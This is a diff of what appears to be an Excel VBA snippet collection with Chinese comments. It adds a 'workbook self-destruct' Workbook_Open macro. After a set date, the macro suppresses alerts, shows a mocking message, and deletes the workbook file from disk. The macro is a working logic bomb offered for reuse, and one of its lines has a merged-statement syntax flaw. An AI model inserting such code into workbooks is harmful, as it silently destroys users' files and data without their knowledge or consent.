@@ -122,6 +122,21 @@ Application.ScreenUpdating = False 
 Application.Calculation = xlManual
 ‘添加行标题
 Range("A1").Resize(1, 5) = Split("1 2 3 4 5", " ")'A1为选定的单元格，（1，5）1代表行，5代表列，后面，分割字符串，逗号后为分割的标志，缺省为空格
+'表格自杀代码，日期检测法
+Private Sub Workbook_Open()
+Dim dat As Date
+dat = DateSerial(2017, 10, 1)'此处为检测日期的方法
+If Date >= dat Then
+Application.DisplayAlerts = False   MsgBox "你好，二货！你相信Excel会成精吗？" & vbCr & "大爷我活够了，我要死了，再见~嘎嘎嘎嘎嘎~。"
+With ThisWorkbook
+.Saved = True
+.ChangeFileAccess xlReadOnly
+Kill .FullName
+.Close
+End With
+End If
+End Sub
+
 
  
 '区域内不为空值则添加边框
